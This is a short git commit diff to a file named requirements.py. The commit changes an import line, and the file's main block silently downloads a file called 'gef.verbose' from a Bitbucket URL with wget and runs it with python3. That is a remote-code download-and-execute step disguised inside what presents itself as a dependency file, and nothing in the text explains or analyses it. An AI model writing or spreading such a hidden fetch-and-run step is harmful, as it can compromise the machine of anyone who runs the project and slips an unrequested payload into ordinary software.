e72a78fa2b8bc0f64b2e802be6b81ddd76d27222
gakira munshi <gakimarki@proton.me>
2024-12-16 15:52:24 -0500

    If it's stupid and it works, it ain't stupid

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,sunau
+import os, sys,errno
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
